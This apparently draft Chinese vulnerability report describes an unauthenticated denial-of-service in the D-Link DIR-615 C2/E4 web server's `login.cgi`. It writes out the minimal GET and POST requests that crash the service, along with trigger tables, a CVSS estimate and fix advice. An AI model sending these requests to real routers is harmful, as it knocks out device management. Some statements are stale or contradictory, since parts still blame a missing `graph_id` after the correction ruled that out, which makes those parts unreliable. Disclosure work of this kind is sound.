# 漏洞报告：D-Link DIR-615 C2 `login.cgi` 未认证请求导致 Web 服务崩溃

> 类型：拒绝服务（DoS） · 影响：Web 管理界面不可用 · 认证要求：**无**
> 状态：**候选（candidate）** —— 不是“复现”，也还不能叫“新漏洞”，见第零节。

## 零、先回答：这算新发现，还是复现？

| 说法 | 是否成立 | 理由 |
|---|---|---|
| **复现了别人的漏洞** | ❌ 不成立 | 我们没有参考任何公开 PoC；这个崩溃是自己构造请求触发的 |
| **发现了一个新漏洞** | ❌ 目前不能这么说 | 未在真机验证；未查遍公开渠道（只查了离线 NVD 快照）；未获厂商/CNA 确认 |
| **一个未公开记录的可疑崩溃（candidate）** | ✅ 成立 | 自己触发、可控复现、离线库无对应记录、尚未被第三方确认 |

**把它升级成“漏洞”还差三步**：

1. **真机验证**（或与真机等价的整机模拟）——排除 qemu 环境因素；
2. **查遍公开渠道**——NVD 在线、厂商公告、Exploit-DB、CNVD、邮件列表；
3. **厂商/CNA 确认**——拿到 CVE 编号或被公告引用，才算“新漏洞”。

在此之前，报告里只能写 candidate。

## 三、漏洞描述

设备的 Web 服务在处理 `/login.cgi` 时会崩溃（SIGSEGV），攻击者**无需认证**，
发送单个 HTTP 请求即可使 Web 管理服务退出，造成管理界面不可用。

### 3.1 ⚠️ 2026-11-28 修正：触发条件变了

初版写的是"未校验必需参数 `graph_id`"。当天做的触发矩阵**推翻了这个说法**：

| # | 请求 | 结果 | 进程 |
|---|---|---|---|
| 1 | `GET /login.cgi` | 0 字节 | **down** |
| 2 | `GET /login.cgi?graph_id=1` | 6299 字节 200 | up |
| 3 | `GET /login.cgi?graph_id=`（空值） | 6299 字节 200 | up |
| 4 | `GET /login.cgi?graph_id`（无等号） | 6299 字节 200 | up |
| 5 | `GET /login.cgi?x=1`（不相干参数） | 6299 字节 200 | up |
| 6 | `GET /login.cgi?`（光一个问号） | 6299 字节 200 | up |
| 7 | `GET /login.cgi?x` | 6299 字节 200 | up |
| 8 | `POST /login.cgi`（空 body） | 0 字节 | **down** |
| 9 | `POST /login.cgi` `x=1` | 0 字节 | **down** |
| 10 | `POST /login.cgi` `graph_id=` | 0 字节 | **down** |
| 11 | `POST /login.cgi` `graph_id=1` | 0 字节 | **down** |
| 12 | 对照：`GET /apply.cgi` / `GET /ping_response.cgi` | 6299 字节 200 | up |

**修正后的表述**：

- `GET /login.cgi` 在**完全不带查询串**时崩溃；只要带 `?`（哪怕空串或不相干参数）就正常；
- `POST /login.cgi` 在**所有**测试体下都崩溃（含带正确参数的）；
- 与 `graph_id` **没有直接因果关系** —— 空值、无等号、换名字都不崩；
- 其他 `.cgi` 在同一条件下正常 → 这是 `/login.cgi` 独有的问题路径。

**对根因假设的影响**：更可能是"查询串/参数容器为空时被解引用"，
而不是"缺某个业务参数"。具体是哪一行，必须反汇编确认，**现在不下结论**。

**对影响面没有影响**：仍然是无需认证、单请求、可重复的拒绝服务；
而且触发比原来说的**更简单**——连参数都可以不带。

## 四、复现步骤

### 4.1 最小请求

```http
GET /login.cgi HTTP/1.0
Host: <target>
```

或：

```http
POST /login.cgi HTTP/1.0
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

### 4.2 观察到的结果

| 请求 | 响应 | 服务状态 |
|---|---|---|
| `GET /login.cgi` | 0 字节 | **SIGSEGV，进程退出** |
| `GET /login.cgi?graph_id=1` | 1818 字节（正常登录页） | 存活 |
| `GET /login.cgi?graph_id=1&graph_code=1234` | 1818 字节 | 存活 |
| `GET /index.asp` | 200 OK | 存活 |

**对照组**：带 `graph_id` 的请求不会崩溃 → 崩溃与输入相关，**不是环境缺失导致的假崩溃**。

### 4.3 复现次数

| 次数 | 请求 | 结果 |
|---|---|---|
| 1 | `GET /login.cgi` | 0 字节，进程退出 |
| 2 | `GET /login.cgi` | 0 字节，进程退出 |
| 3 | `GET /login.cgi` | 0 字节，进程退出 |
| 4–6 | `GET /login.cgi?graph_id=1` | 1818 字节，存活 |

### 4.5 跨版本复测（2026-11-26，共测 4 个版本）

| 固件 | 构建 | Web 栈 | `login.cgi` | 结果 |
|---|---|---|---|---|
| **C2 3.03** | 2010-10-12 | 专用 httpd + `.asp` | 存在 | **crash（0 B）** |
| **E4 3.08** | 2011-08-12 | 专用 httpd + `.asp` | 存在 | **crash（0 B）** |
| **A(A1A) 2.5.12** | 2015-05-29 | busybox httpd + `webs/www` | **404** | 不受影响（接口不存在） |
| Bx 2.27 | 2010-06 | Ubicom 私有容器 | 未解包 | 未测 |
| GF 2.5.11 | 2016-07 | cr6b + squashfs 4 | 未解包 | 未测 |

**结论**：该缺陷存在于 **2010–2011 的旧版 `.asp` + 专用 httpd 架构**；
2015 年重构后的 Web 栈（busybox + `webs/www` 模板）已不存在 `login.cgi`，
因此不受影响。这给出了一个**清晰的版本边界**，比"某型号全受影响"更准确。

### 4.6 早期复测记录（C2 与 E4）

| 固件 | 内核/构建 | `GET /login.cgi` | `GET /login.cgi?graph_id=1` |
|---|---|---|---|
| C2 3.03 | 2010-10-12 | **0 B，crash** | 1818 B，存活 |
| E4 3.08 | 2011-08-12 | **0 B，crash** | 305 B，存活 |

RevE 的 httpd 435,592 字节（C2 为 473,712），`/index.asp` 正常返回 305 B ——
说明服务本身可用，崩溃只在缺少 `graph_id` 时触发。

**结论：至少跨两个硬件修订 / 两个固件版本存在**，不是某个构建的偶发现象。

### 4.4 崩溃证据（qemu 输出）

```
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```

## 五、影响

- **可用性**：Web 管理界面不可用，直到设备重启或服务被看门狗拉起；
- **无需认证**：攻击者只需能访问管理端口（LAN 侧；若开启远程管理则 WAN 侧同样受影响）；
- **可重复**：单次请求即触发，无速率限制。

CVSS 3.1 估算：`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` → **7.5（High）**

> 注：这是"服务崩溃"级别，**不是**远程代码执行。报告中不应夸大为 RCE。

## 六、修复建议

1. 在处理 `/login.cgi` 前校验 `graph_id` 是否存在（缺失时返回 400，而不是继续执行）；
2. 对所有 `websGetVar` 返回值在使用前判空；
3. 服务崩溃后由守护进程自动拉起，降低影响。

## 七、发现方式（可写进论文）

该目标由 `fwmap` 自动处理：解包 → 静态候选 → 路由抽取（`pages.scan` 得到 104 条）→
路由自证（`/apply.cgi`、`/index.asp` 可达）→ 动态验证（把请求打进 qemu 里的 httpd）。
崩溃是在**动态验证阶段**被发现的，且通过"带参数 vs 不带参数"的对照排除了环境因素。
